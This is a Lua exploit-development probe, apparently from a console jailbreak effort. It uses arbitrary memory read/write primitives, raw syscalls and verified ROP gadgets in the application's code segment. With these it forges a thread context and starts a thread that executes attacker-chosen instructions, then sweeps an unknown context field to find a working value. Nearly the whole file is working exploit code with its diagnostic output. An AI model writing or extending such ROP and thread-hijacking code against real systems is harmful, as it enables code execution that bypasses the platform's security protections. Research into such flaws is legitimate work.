-- CRASH_CLASS: MODERATE
-- PROBE 127i: Clone 156d's exact working pattern
--
-- 127h failed (ret=-1, TID written but thread rejected).
-- This probe clones 156d's EXACT working pattern:
--   RIP = mov [rdi],rax;ret gadget
--   RSP = stack top where [0] = jmp $ addr (child parks after write)
--   RDI = shared page address
--   RAX = marker value
--   +0xD0 = 0 (not 7)
--
-- If this works → 127h's issue is either +0xD0=7 or the ret-based ROP entry.
-- If this fails → something else changed since 156d ran.

print("=== PROBE 127i: 156d CLONE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid
end

-- Eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", text_hi, text_lo))

local function eaddr(offset)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + offset))
end

-- Gadgets
local G_MOV_W    = 0x92C67   -- mov [rdi],rax;ret (48 89 07 C3)
local G_JMP_SELF = 0x15481   -- jmp $ (EB FE)

-- Verify the two gadgets we need
local d1 = rd(N(eaddr(G_MOV_W))) or 0
if d1 < 0 then d1 = d1 + 0x100000000 end
local m0 = d1 % 256
local m1 = math.floor(d1 / 256) % 256
local m2 = math.floor(d1 / 65536) % 256
local m3 = math.floor(d1 / 16777216) % 256
print(string.format("mov_w: %02X %02X %02X %02X %s", m0, m1, m2, m3,
    (m0 == 0x48 and m1 == 0x89 and m2 == 0x07 and m3 == 0xC3) and "OK" or "BAD"))

local d2 = rd(N(eaddr(G_JMP_SELF))) or 0
if d2 < 0 then d2 = d2 + 0x100000000 end
local j0 = d2 % 256
local j1 = math.floor(d2 / 256) % 256
print(string.format("jmp$:  %02X %02X %s", j0, j1,
    (j0 == 0xEB and j1 == 0xFE) and "OK" or "BAD"))

if not ((m0 == 0x48 and m1 == 0x89 and m2 == 0x07 and m3 == 0xC3)
    and (j0 == 0xEB and j1 == 0xFE)) then
    print("GADGET MISMATCH") return
end

-- Allocations
local shared  = memory.alloc(0x1000)
local stk_buf = memory.alloc(0x4000)
local ctx_buf = memory.alloc(0x500)
local tid_buf = memory.alloc(8)

local S   = N(shared)
local STK = N(stk_buf)
local BC  = N(ctx_buf)
local TB  = N(tid_buf)

print(string.format("shared=%s stk=%s ctx=%s tid=%s",
    fmt(shared), fmt(stk_buf), fmt(ctx_buf), fmt(tid_buf)))

-- Zero shared and tid
wq(S, uint64("0x0"))
wq(S + 8, uint64("0x0"))
wq(TB, uint64("0x0"))

-- Stack: put jmp$ address at the top (first thing popped by ret after mov_w)
local STK_TOP = STK + 0x4000 - 0x100  -- near top, 16-byte aligned
wq(STK_TOP, eaddr(G_JMP_SELF))        -- child parks here after the write

if not alive() then print("DIED setup!") return end

-- [A] Build ucontext — clone 156d exactly
print("")
print("[A] Ucontext (156d clone)")

-- Zero full struct
for off = 0, 0x4BC, 4 do wd(BC + off, 0) end

-- Gates
wd(BC + 0x108, 0x480)      -- gate 1
wd(BC + 0xD0, 0)           -- gate 2 = 0 (not 7!)
wd(BC + 0x110, 0x10000)    -- gate 3

-- Segment registers
wd(BC + 0xC0, 0x43)        -- CS
wd(BC + 0x100, 0x3B)       -- SS

-- RIP = mov [rdi],rax;ret gadget directly
local rip_val = text_lo + G_MOV_W
local rip_lo = rip_val % 0x100000000
local rip_hi = text_hi + math.floor(rip_val / 0x100000000)
wd(BC + 0xE0, rip_lo)
wd(BC + 0xE4, rip_hi)

-- RSP = stack with jmp$ at [0]
local rsp_lo = STK_TOP % 0x100000000
local rsp_hi = math.floor(STK_TOP / 0x100000000)
wd(BC + 0xF8, rsp_lo)
wd(BC + 0xFC, rsp_hi)

-- GP registers (156d style: set the ones that matter)
-- RDI (+0x48) = shared address (destination for write)
local rdi_lo = S % 0x100000000
local rdi_hi = math.floor(S / 0x100000000)
wd(BC + 0x48, rdi_lo)
wd(BC + 0x4C, rdi_hi)

-- RAX (+0x78) = marker value to write
wd(BC + 0x78, 0xCAFE0001)       -- low 32
wd(BC + 0x7C, 0xDEADBEEF)       -- high 32

print(string.format("  RIP=0x%X%08X (mov [rdi],rax;ret)", rip_hi, rip_lo))
print(string.format("  RSP=0x%X%08X (stk top, [0]=jmp$)", rsp_hi, rsp_lo))
print(string.format("  RDI=0x%X%08X (shared)", rdi_hi, rdi_lo))
print("  RAX=0xDEADBEEFCAFE0001")
print("  +0xD0=0 (match 156d)")

-- Readback verification
local ck_rip = rq(BC + 0xE0)
local ck_rsp = rq(BC + 0xF8)
local ck_rdi = rq(BC + 0x48)
local ck_rax = rq(BC + 0x78)
local ck_g2  = rd(BC + 0xD0) or -1
print(string.format("  readback RIP=%s RSP=%s", fmt(ck_rip), fmt(ck_rsp)))
print(string.format("  readback RDI=%s RAX=%s g2=%d", fmt(ck_rdi), fmt(ck_rax), ck_g2))

if not alive() then print("DIED building ctx!") return end

-- [B] Create thread
print("")
print("[B] thr_create")
local sc_thr = mk(430)
local thr_ret = nil
local thr_ok = pcall(function()
    thr_ret = sc_thr(ctx_buf, tid_buf, uint64(0), uint64(0), uint64(0), uint64(0))
end)

local tid_val = rq(TB)
print(string.format("  ret=%s tid=%s ok=%s",
    fmt(thr_ret), fmt(tid_val), tostring(thr_ok)))

if not alive() then print("DIED after thr_create!") return end

-- [C] Check results
print("")
print("[C] Results")

-- Give child time to execute (it's one instruction + park)
for i = 1, 200 do native.fcall_with_rax(stub, 20) end

local v0 = rq(S)
local v8 = rq(S + 8)
print(string.format("  shared[0]=%s", fmt(v0)))
print(string.format("  shared[8]=%s", fmt(v8)))

local expected = uint64("0xDEADBEEFCAFE0001")
if v0 and fmt(v0) == fmt(expected) then
    print("  *** CHILD THREAD WROTE MARKER! ***")
elseif v0 and N(v0) ~= 0 then
    print("  child wrote something unexpected")
else
    print("  shared still zero")
end

-- thr_kill check
if tid_val and N(tid_val) ~= 0 then
    local sc_kill = mk(433)
    local kr = nil
    pcall(function()
        kr = sc_kill(tid_val, uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    print(string.format("  thr_kill(tid,0)=%s", fmt(kr)))
end

-- [D] If failed: try variants
if v0 == nil or N(v0) == 0 then
    print("")
    print("[D] Diagnostic: try +0xD0 values 0-6")
    for d0_val = 0, 6 do
        -- Re-zero ctx
        for off = 0, 0x4BC, 4 do wd(BC + off, 0) end
        wd(BC + 0x108, 0x480)
        wd(BC + 0xD0, d0_val)
        wd(BC + 0x110, 0x10000)
        wd(BC + 0xC0, 0x43)
        wd(BC + 0x100, 0x3B)
        wd(BC + 0xE0, rip_lo)
        wd(BC + 0xE4, rip_hi)
        wd(BC + 0xF8, rsp_lo)
        wd(BC + 0xFC, rsp_hi)
        wd(BC + 0x48, rdi_lo)
        wd(BC + 0x4C, rdi_hi)
        wd(BC + 0x78, 0xCAFE0001)
        wd(BC + 0x7C, 0xDEADBEEF)

        -- Reset shared
        wq(S, uint64("0x0"))
        wq(TB, uint64("0x0"))

        local r2 = nil
        pcall(function()
            r2 = sc_thr(ctx_buf, tid_buf, uint64(0), uint64(0), uint64(0), uint64(0))
        end)
        local t2 = rq(TB)
        -- Wait briefly
        for i = 1, 100 do native.fcall_with_rax(stub, 20) end
        local s2 = rq(S)
        print(string.format("  d0=%d: ret=%s tid=%s shared=%s",
            d0_val, fmt(r2), fmt(t2), fmt(s2)))

        if not alive() then print("DIED in sweep!") return end
        if s2 and N(s2) ~= 0 then
            print("  *** FOUND WORKING d0 VALUE ***")
            break
        end
    end
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 127i COMPLETE ===")
